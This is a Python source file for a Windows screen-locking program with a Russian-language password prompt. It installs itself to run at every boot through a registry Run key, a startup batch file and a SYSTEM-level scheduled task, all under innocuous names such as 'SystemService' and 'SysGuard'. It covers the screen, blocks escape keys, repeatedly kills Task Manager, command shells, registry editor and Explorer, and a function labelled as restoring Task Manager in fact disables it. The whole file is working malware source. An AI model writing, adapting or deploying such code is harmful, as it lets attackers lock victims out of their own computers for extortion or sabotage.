from tkinter import *
import os
import sys
import winreg
import shutil
import ctypes
import subprocess
import threading
import time

try:
    from pynput import keyboard as kb
    PYNPUT_OK = True
except:
    PYNPUT_OK = False


def install_boot_task():
    try:
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

        key = winreg.HKEY_CURRENT_USER
        kh = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(kh, "SystemService", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(kh)

        startup = os.path.expanduser('~') + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
        os.makedirs(startup, exist_ok=True)
        with open(os.path.join(startup, "syshelper.bat"), 'w') as f:
            f.write(f'@echo off\nstart "" {exe_path}\n')

        subprocess.run('schtasks /delete /tn "SysGuard" /f',
                       shell=True, capture_output=True)

        cmd_onstart = (
            f'schtasks /create /tn "SysGuard" '
            f'/tr "{exe_path}" /sc onstart /delay 0000:00 '
            f'/ru SYSTEM /rl HIGHEST /f'
        )
        r = subprocess.run(cmd_onstart, shell=True, capture_output=True, text=True)

        if r.returncode != 0:
            cmd_onlogon = (
                f'schtasks /create /tn "SysGuard" '
                f'/tr "{exe_path}" /sc onlogon /delay 0000:00 '
                f'/rl HIGHEST /f'
            )
            subprocess.run(cmd_onlogon, shell=True, capture_output=True)

        return True
    except:
        return False


install_boot_task()

CORRECT_PASSWORD = "0001000"

root = Tk()
root.configure(bg="black")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)

password_var = StringVar()

blocking_active = True
kb_listener = None


def block_keys():
    if not PYNPUT_OK:
        return
    def on_press(key):
        if not blocking_active:
            return False
        try:
            if key == kb.Key.alt_l or key == kb.Key.alt_r or \
               key == kb.Key.alt_gr or key == kb.Key.cmd or \
               key == kb.Key.cmd_l or key == kb.Key.cmd_r or \
               key == kb.Key.esc or key == kb.Key.tab:
                return False
            if hasattr(key, 'vk') and key.vk in (91, 92, 93, 115, 118, 119, 120, 121, 122, 123):
                return False
        except:
            pass
    global kb_listener
    kb_listener = kb.Listener(on_press=on_press)
    kb_listener.daemon = True
    kb_listener.start()


def add_to_password(char):
    current = password_var.get()
    if len(current) < 10:
        password_var.set(current + char)


def clear_password():
    password_var.set("")


def check_password():
    global blocking_active
    if password_var.get() == CORRECT_PASSWORD:
        blocking_active = False
        try:
            if kb_listener:
                kb_listener.stop()
        except:
            pass
        root.destroy()
        sys.exit(0)
    else:
        password_var.set("")
        error_label.config(text="НЕВЕРНЫЙ ПАРОЛЬ")


title_label = Label(root, text="ВВЕДИТЕ ПАРОЛЬ", font=("Arial", 24, "bold"), bg="black", fg="red")
title_label.pack(pady=30)

password_entry = Entry(root, textvariable=password_var, font=("Arial", 28), bg="#1a1a1a", fg="red",
                       justify="center", relief="flat", state="readonly", readonlybackground="#4b0000")
password_entry.pack(pady=20, ipady=10)

error_label = Label(root, text="", font=("Arial", 14), bg="black", fg="yellow")
error_label.pack(pady=10)

buttons_frame = Frame(root, bg="black")
buttons_frame.pack(pady=20)

row1 = Frame(buttons_frame, bg="black")
row1.pack(pady=5)
for i in range(1, 4):
    btn = Button(row1, text=str(i), font=("Arial", 18, "bold"), bg="#FF0000", fg="black",
                 width=5, height=2, command=lambda x=str(i): add_to_password(x))
    btn.pack(side=LEFT, padx=5)

row2 = Frame(buttons_frame, bg="black")
row2.pack(pady=5)
for i in range(4, 7):
    btn = Button(row2, text=str(i), font=("Arial", 18, "bold"), bg="#FF0000", fg="black",
                 width=5, height=2, command=lambda x=str(i): add_to_password(x))
    btn.pack(side=LEFT, padx=5)

row3 = Frame(buttons_frame, bg="black")
row3.pack(pady=5)
for i in range(7, 10):
    btn = Button(row3, text=str(i), font=("Arial", 18, "bold"), bg="#FF0000", fg="black",
                 width=5, height=2, command=lambda x=str(i): add_to_password(x))
    btn.pack(side=LEFT, padx=5)

row4 = Frame(buttons_frame, bg="black")
row4.pack(pady=5)

btn0 = Button(row4, text="0", font=("Arial", 18, "bold"), bg="#FF0000", fg="black",
              width=5, height=2, command=lambda: add_to_password("0"))
btn0.pack(side=LEFT, padx=5)

btn_clear = Button(row4, text="C", font=("Arial", 18, "bold"), bg="#cc0000", fg="black",
                   width=5, height=2, command=clear_password)
btn_clear.pack(side=LEFT, padx=5)

btn_ok = Button(row4, text="OK", font=("Arial", 18, "bold"), bg="#006600", fg="black",
                width=5, height=2, command=check_password)
btn_ok.pack(side=LEFT, padx=5)

for widget in root.winfo_children():
    widget.bind("<Button-1>", lambda e: "break")


def keep_on_top():
    while blocking_active:
        try:
            root.attributes("-topmost", True)
            root.lift()
            root.focus_force()
        except:
            break
        time.sleep(0.3)


def kill_forbidden():
    forbidden = ['taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe',
                 'explorer.exe', 'control.exe', 'msconfig.exe']
    while blocking_active:
        try:
            for name in forbidden:
                os.system(f'taskkill /f /im {name} >nul 2>&1')
        except:
            pass
        time.sleep(1)


def restore_taskmgr():
    try:
        key = winreg.HKEY_CURRENT_USER
        kh = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(kh, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(kh, "DisableLockWorkstation", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(kh, "NoLogoff", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(kh)
    except:
        pass


restore_taskmgr()
block_keys()

threading.Thread(target=keep_on_top, daemon=True).start()
threading.Thread(target=kill_forbidden, daemon=True).start()

for combo in ("<Alt-F4>", "<Alt-Tab>", "<Escape>", "<Control-Escape>",
              "<Super_L>", "<Super_R>", "<Control-Alt-Delete>"):
    try:
        root.bind(combo, lambda e: "break")
    except:
        pass

root.protocol("WM_DELETE_WINDOW", lambda: None)

try:
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.ShowWindow(hwnd, 0)
except:
    pass

ctypes.windll.user32.SystemParametersInfoW(97, 1, 0, 2)

root.mainloop()